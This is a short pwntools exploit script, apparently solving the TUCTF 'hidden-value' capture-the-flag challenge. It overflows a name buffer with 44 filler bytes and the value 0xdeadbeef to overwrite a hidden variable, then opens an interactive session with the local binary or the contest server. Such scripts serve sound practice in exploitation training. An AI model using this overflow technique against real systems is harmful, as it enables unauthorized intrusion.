from pwn import *

local = True
elf = ELF('./hidden-value')

if local:
    io = elf.process()
else:
    io = remote('chal.tuctf.com', 30011)
raw_input('start magic')

pld = b""
pld += b"A"*44
pld += p64(0xdeadbeef)

io.sendlineafter(b"ame: ", pld)
#recieved = io.clean()
#info (f"rec: {recieved}")

io.interactive()
